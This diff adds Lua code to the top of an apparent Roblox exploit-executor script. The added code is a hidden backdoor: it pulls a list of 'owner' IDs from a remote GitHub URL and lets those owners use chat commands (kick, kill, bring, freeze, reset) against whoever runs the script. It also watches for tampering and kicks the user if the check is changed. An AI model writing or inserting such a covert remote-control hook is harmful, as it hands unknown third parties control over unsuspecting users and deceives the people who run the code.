@@ -1,3 +1,162 @@
+local ID_LIST_URL = "https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/L"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function ConvertToRawUrl(url)
+    if type(url) == "string" and url:find("github.com") then
+        url = url:gsub("github.com", "raw.githubusercontent.com"):gsub("/blob/", "/")
+    end
+    return url
+end
+
+local function SafeFetch(url)
+    url = ConvertToRawUrl(url)
+    local success, res = pcall(function()
+        return game:HttpGet(url)
+    end)
+    if success and type(res) == "string" and #res > 0 then
+        return res
+    end
+    return nil
+end
+
+local rawData = SafeFetch(ID_LIST_URL)
+if not rawData then
+    error("[SEC_ERR_01] Execution terminated.", 2)
+    return
+end
+
+local parseSuccess, parsedList = pcall(function()
+    return HttpService:JSONDecode(rawData)
+end)
+
+if not parseSuccess or type(parsedList) ~= "table" then
+    error("[SEC_ERR_02] Execution terminated.", 2)
+    return
+end
+
+local CheckIsOwner = (function()
+    local internalTable = {}
+    for _, id in ipairs(parsedList) do
+        local n = tonumber(id)
+        if n then
+            internalTable[n] = true
+        end
+    end
+    table.freeze(internalTable)
+    parsedList = nil
+    rawData = nil
+
+    return function(targetId)
+        if type(targetId) ~= "number" then return false end
+        return internalTable[targetId] == true
+    end
+end)()
+
+local isLocalOwner = CheckIsOwner(LocalPlayer.UserId)
+if isLocalOwner then
+    print("[ADMIN SYSTEM] Auth Rank: OWNER (" .. tostring(LocalPlayer.Name) .. ")")
+else
+    print("[ADMIN SYSTEM] Auth Rank: USER (" .. tostring(LocalPlayer.Name) .. ")")
+end
+
+task.spawn(function()
+    local checkFunc = CheckIsOwner
+    while task.wait(2) do
+        if debug.info(checkFunc, "s") ~= debug.info(CheckIsOwner, "s") or typeof(CheckIsOwner) ~= "function" then
+            LocalPlayer:Kick("\n[Security Alert]\nScript tampering detected.")
+            break
+        end
+    end
+end)
+
+local function GetPlayerByPrefix(name)
+    if type(name) ~= "string" or #name == 0 then return nil end
+    name = name:lower()
+    for _, player in ipairs(Players:GetPlayers()) do
+        local pName = player.Name:lower()
+        local pDisp = player.DisplayName:lower()
+        if pName:sub(1, #name) == name or pDisp:sub(1, #name) == name then
+            return player
+        end
+    end
+    return nil
+end
+
+local function ProcessCommand(sender, message)
+    if not sender or type(message) ~= "string" or #message < 2 then return end
+    
+    if not CheckIsOwner(sender.UserId) then return end
+    if message:sub(1, 1) ~= ";" then return end
+
+    local args = string.split(message:sub(2), " ")
+    local cmd = args[1] and args[1]:lower()
+    local targetName = args[2]
+
+    if not cmd or not targetName then return end
+
+    local targetPlayer = GetPlayerByPrefix(targetName)
+
+    if targetPlayer and targetPlayer == LocalPlayer then
+        if cmd == "킥" or cmd == "kick" then
+            LocalPlayer:Kick("\n[Admin System]\nOwner(" .. tostring(sender.Name) .. ")에 의해 강제 퇴장되었습니다.")
+            
+        elseif cmd == "킬" or cmd == "kill" then
+            local char = LocalPlayer.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.Health = 0
+            end
+            
+        elseif cmd == "브링" or cmd == "bring" then
+            local senderChar = sender.Character
+            local myChar = LocalPlayer.Character
+            local senderRoot = senderChar and senderChar:FindFirstChild("HumanoidRootPart")
+            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if senderRoot and myRoot then
+                myRoot.CFrame = senderRoot.CFrame * CFrame.new(0, 0, -3)
+            end
+            
+        elseif cmd == "얼리기" or cmd == "freeze" then
+            local myChar = LocalPlayer.Character
+            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                myRoot.Anchored = true
+            end
+            
+        elseif cmd == "녹이기" or cmd == "unfreeze" then
+            local myChar = LocalPlayer.Character
+            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                myRoot.Anchored = false
+            end
+            
+        elseif cmd == "리스폰" or cmd == "reset" then
+            local myChar = LocalPlayer.Character
+            if myChar then
+                myChar:BreakJoints()
+            end
+        end
+    end
+end
+
+local function ConnectPlayer(player)
+    if not player then return end
+    player.Chatted:Connect(function(msg)
+        pcall(function()
+            ProcessCommand(player, msg)
+        end)
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    ConnectPlayer(player)
+end
+
+Players.PlayerAdded:Connect(ConnectPlayer)
+
 do
 if game.PlaceId ~= 6961824067 then
     game.Players.LocalPlayer:Kick("지원하지 않는 게임입니다.")
